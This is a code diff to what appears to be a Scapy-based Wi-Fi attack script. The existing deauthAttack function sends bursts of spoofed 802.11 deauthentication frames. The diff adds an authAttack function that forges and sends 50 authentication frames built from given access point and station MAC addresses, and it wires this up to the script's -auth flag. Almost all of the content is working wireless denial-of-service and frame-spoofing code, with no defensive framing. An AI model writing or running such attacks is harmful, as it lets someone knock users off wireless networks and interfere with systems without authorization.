@@ -30,6 +30,11 @@ def deauthAttack(interface, ap, station=None):
         pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
         sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)
 
+def authAttack(interface, ap, station):
+    target = ap
+    gateway = station
+    pkt = RadioTap() / Dot11(type=0, subtype=11, addr1=target, addr2=gateway, addr3=gateway) / Dot11Auth(seqnum=1)
+    sendp(pkt, inter=0.1, count=50, iface=interface)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -38,11 +43,13 @@ if __name__ == "__main__":
     parser.add_argument('-c', metavar='MAC', help=' : Station MAC')
     parser.add_argument('-auth', action='store_true', help=' : Auth Attack')
     args = parser.parse_args()
-
-    if args.auth:
-        print("It'll be applied asap.")
+    if (args.interface is None) or (args.ap is None):
+        print("Insufficient Args")
     else:
-        deauthAttack(args.interface, args.ap, args.c)
+        if args.auth:
+            authAttack(args.interface, args.ap, args.c)
+        else:
+            deauthAttack(args.interface, args.ap, args.c)
 
 
 
